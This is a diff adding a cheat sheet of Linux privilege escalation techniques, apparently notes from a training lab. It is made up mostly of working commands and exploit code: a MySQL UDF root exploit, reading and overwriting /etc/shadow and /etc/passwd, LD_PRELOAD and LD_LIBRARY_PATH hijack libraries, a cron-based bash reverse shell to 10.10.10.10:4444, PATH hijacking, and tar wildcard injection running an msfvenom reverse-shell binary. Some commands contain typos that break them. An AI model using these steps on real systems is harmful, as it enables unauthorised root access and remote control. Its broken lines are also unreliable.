@@ -1,0 +1,276 @@
+
+
+#--------------	LINUX PRIVILEGE ESCALATION -----------------#
+
+
+#1# SERVICE EXPLOITS
+
+MySQL service running:
+
+    The service is runnin as root, can use a popular exploit to abuse this.
+    Takes advantage of User Defined Functioins (UDFs) to run system commands as root.
+
+cd /home/user/tools/mysql-udf
+
+# complile raptor_udf2.c exploit
+
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor-udf2.so raptor_udf2.o -lc
+
+# connect to mysql as root with blank pass
+
+mysql -u root
+
+# execute following commands on mysql shell:
+
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system return integer soname 'raptor_udf2.so';
+
+# use function to copy bash to /tmp/rootbash and set SUID
+
+select do_system('cp /bin/bash /tmp/rootbash: chmod +xs /tmp/rootbash');
+
+# exit mysql shell 'exit' or '\q'
+# run the rootbash we created with -p 
+
+/tmp/rootbash -p
+
+# root shell achieved
+
+###############################################################################
+
+#2#  WEAK FILE PERMISSIONS
+
+/etc/shadow contain password hashes and normaly readable only by root.
+
+# /etc/shadow is world readable
+
+ls -l /etc/shadow
+
+cat /etc/shadow
+
+# crack hashes with john the ripper
+
+###############################################################################
+
+#3# WEAK FILE PERMISSIONS
+
+/etc/shadow world writeable (o.O )
+
+ls -l /etc/shadow
+
+# generate password hash of your choice
+
+mkpasswd -m sha-512 newpasswordhere
+
+# edit /etc/shadow and replace the password hash for yours
+# switch to root user using the new pass
+
+###############################################################################
+
+#4# WEAK FILE PERMISSIONS WRITABLE /etc/passwd
+
+ls -l /etc/passwd
+
+# generate password
+
+openssl passwd newpasswordhere
+
+# Edit the /etc/passwd file and place the generated password hash 
+# between the first and second colon (:) of the root user's row (replacing the "x").
+
+# switch to the root user
+
+su root
+
+# can also create a new user, duplicating the existing root line and "root" with "newUsername"
+
+su newUsername
+
+################################################################################
+
+#5# Sudo - Shell Escape Sequences
+
+# list programs allowed to run by sudo.
+
+sudo -l
+
+# search the programs on the results in https://gtfobins.github.io
+# if the program is listed with "sudo" as a function,
+# can be used to escalate privileges, usually via an escape sequence.
+
+################################################################################
+
+#6# Sudo - Envoirement variables
+
+# configure sudo to inherit envoirement variables
+# Check which enviroment variables arer inherited
+
+sudo -l
+
+# ld_PRELOAD and LD_LIBRARY_PATH are inherited from the user env.
+# LD_PRELOAD > loads a shared object before any others when a program is run.
+# LD_LIBRARY_PATH > provides a list of directories where shared libraries are searched for first.
+
+# create a shared object whit the following code:
+
+###
+user@debian:~$ cat preload.c 
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+###
+
+# Compile preload.c into a .so file
+
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+
+# then we can run one of the programas you are allowed to run as sudo,
+# setting the LD_PRELOAD envoirement variable to the path of the new shared object
+
+sudo LD_PRELOAD=/tmp/preload.so program.name.here
+
+# root shell should spawn
+
+#########################
+
+# run ldd against one of hte programs to see which shared libraries are used by it.
+
+ldd /usr/sbin/apache2
+
+# create a shared object with the name library_path.c
+# using the following code:
+###
+user@debian:~$ cat library_path.c 
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+###
+
+# compile library_path.c with the same name of one of the shared libraries (libcrypt.so.1)
+
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
+
+# Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to /tmp
+# (where the compiled library is)
+
+sudo LD_LIBRAR_PATH=/tmp apache2
+
+# root shell should spawn
+
+##########################################################################################
+
+#7# CRON JOBS - File Permissions
+
+# Cron jobs are programs or scripts which can be set to run at specific time intervals.
+# Cron tables (crontab) store the config for cron jobs. located at /etc/crontab
+
+# view crontab contents
+
+cat /etc/crontab
+
+# check for any bash script with write permissions
+
+locate overwrite.sh
+
+ls -l /usr/local/bin/overwrite.sh
+
+# add or repplace code inside the file
+# bash rev shell:
+###
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+###
+# change 10.10.10.10 and 4444 for your listener
+
+# netcat listener:
+
+nc -lvnp 4444
+
+# whait for the cronjob to run.
+# It runs as root, should get a root shell back.
+
+#########################################################################################
+
+#8# Cron jobs - PATH environment variable
+
+# view the contents of the system-wide crontab:
+
+cat /etc/crontab
+
+# overwrite.sh is not defined by absolute path
+# on the PATH /home/user is set the first
+# PATH HIGHJACKING
+
+# create a overwrite.sh file with the following content:
+###
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+###
+
+# make it executable 
+
+chmod +x overwrite.sh
+
+# after the cronjob is done you should have an executable with root priviledge
+
+/tmp/rootbash -p
+
+########################################################################################
+
+#9# Cron Jobs - WILDCARDS
+
+# The script on the cron job uses tar to compress the home folder of user
+# for this it uses a wildcard (*)
+# we can abuse this creating files which names correspond with options for the tar executable
+# tar can do checkpoints and execute different things on checkpoints
+
+#create a reverse shell script in .elf using msfvenom
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+
+#send it to the target machine
+
+scp shell.elf user@target:/home/user/shell.elf
+
+# make it executable
+
+chmod +x shell.elf
+
+# create two files that correspond with the options
+
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+# start a netcat listener and wait for the shell
+
+
+references:
+	https://gtfobins.github.io/gtfobins/tar/#sudo 
+
+
+
+
+
+
+
+
+
